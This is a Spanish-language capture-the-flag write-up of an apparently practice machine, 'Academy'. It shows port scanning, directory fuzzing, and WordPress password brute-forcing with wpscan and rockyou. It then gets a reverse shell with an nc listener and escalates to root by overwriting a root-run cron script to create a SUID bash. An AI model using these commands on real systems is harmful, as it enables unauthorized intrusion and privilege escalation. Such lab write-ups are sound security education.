CTF ACADEMY
empezamos creando la carpeta mkdir academy   

░▒▓    ~/Escritorio  ✔ ▓▒░ cd academy   

░▒▓    ~/Escritorio/academy  ✔ ▓▒░ ls

RECONOCIMIENTO
░▒▓    ~/Escritorio/academy  ✔ ▓▒░ recon IP
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

░▒▓    ~/Escritorio/academy  ✔  took  4s ▓▒░ extractPorts allPorts                                                                             

[*] Extracting information...

        [*] IP Address: 
        [*] Open ports: 22,80

[*] Ports copied to clipboard


░▒▓    ~/Escritorio/academy  ✔ ▓▒░ enum 22,80 IP
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 cb:96:e2:96:ae:29:8d:89:da:c0:c6:86:d8:3a:57:12 (ECDSA)
|_  256 8d:8d:c4:c3:5e:ba:f1:2f:ff:1a:d1:97:ef:6a:2f:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Apache2 Debian Default Page: It works

Resolvemnos la ip y el dominio para que lo identifique
sudo nano /etc/hosts dominio: http://academy.thl/

ENUMERACION WEB
web dominio
wordpress            (Status: 301) [Size: 318] [--> http://192.168/wordpress/]

FUZZING
fuzzeo  web para ver dominio ocultos
wfuzz --hc 404,403 -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt http://academy.thl/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://academy.thl/FUZZ
Total requests: 128623

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000315:   301        9 L      28 W       314 Ch      "wordpress"                                                                                                                                                                
000032102:   200        368 L    933 W      10701 Ch    "index.html"                                                                                                                                                               
000032822:   200        368 L    933 W      10701 Ch    "."                                                                                                                                                                        

Total time: 99.21479
Processed Requests: 128611
Filtered Requests: 128608
Requests/sec.: 1296.288

 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 3: URL rejected: Malformed input to a URL function

<img width="1920" height="1001" alt="subdominio" src="https://github.com/user-attachments/assets/472ea218-fb40-4442-be71-b110e49bf059" />

Identificacion de credenciales
wpscan --update --url http://academy.thl/wordpress/ --enumerate u,ap -U admin -P /usr/share/wordlists/rockyou.txt

wpscan --update --url http://academy.thl/wordpress/ --enumerate u,ap -U dylan -P /usr/share/wordlists/rockyou.txt
conseguimos credenciales: [!] Valid Combinations Found:
 | Username: dylan, Password: password1

ahora entramos al panel de control de wordpress: http://academy.thl/wordpress/wp-admin/
y colocamos las credenciales Username: dylan, Password: password1
<img width="1920" height="1003" alt="panelwordpress" src="https://github.com/user-attachments/assets/34d7f48c-f21a-428c-8f98-ec5b2d789dc1" />

con la web https://www.urlencoder.org/ encodeamos el comando para que nos llegue la shell 
y nos ponemos ala escucha.
<img width="1920" height="1003" alt="panelcontrol" src="https://github.com/user-attachments/assets/622420e9-1a01-48d0-88d1-3ff36cc3b63b" />

Tratamos la TTY
www-data@debian:/var/www/html/wordpress/kaleth$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@debian:/var/www/html/wordpress/kaleth$ ^[[200~python3 -c 'import pty; pty.spawn("/bin/bash")'^[[201~
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@debian:/var/www/html/wordpress/kaleth$ ^Z
[1]+  Detenido                   nc -lvp 9000

┌──(predator㉿predator)-[~/Escritorio/academy]
└─$ stty raw -echo ; fg
nc -lvp 9000
            ls
backup.sh  kaleth.html  kaleth.php  pspy64  rev.php  shell.php
www-data@debian:/var/www/html/wordpress/kaleth$ reset xterm
www-data@debian:/var/www/html/wordpress/kaleth$ export SHELL=bash
www-data@debian:/var/www/html/wordpress/kaleth$ stty size
24 80
www-data@debian:/var/www/html/wordpress/kaleth$ stty rows 45 columns 180

ESCALADA DE PRIVILEGIOS
sudo -l

para ver si hay algo para explotar. Requiere contraseña.

Nos descargamos la herramienta pspy64.

wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

Realizamos lo siguiente para ejecutarlo.

chmod +x pspy64
./pspy64

econtramos: 2026/06/28 11:38:01 CMD: UID=0     PID=2460   | /bin/sh -c /opt/backup.sh 

Vemos que hay un error en las extensiones por lo que creamos el archivo backup.sh. Es un archivo con permisos SUID .
realizamos los siguientes pasos:
1. echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /opt/backup.sh
2. chmod +x /opt/backup.sh
3. ls -l /tmp/rootbash
4. /tmp/rootbash -p

ww-data@debian:/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@debian:/tmp$ ls -l /tmp/rootbash
-rwsr-sr-x 1 root root 1265648 Jun 28 13:02 /tmp/rootbash
www-data@debian:/tmp$ /tmp/rootbash -p
rootbash-5.2# ls
backup.sh  pspy64  rootbash
rootbash-5.2# whoami
root
Ahora somos root

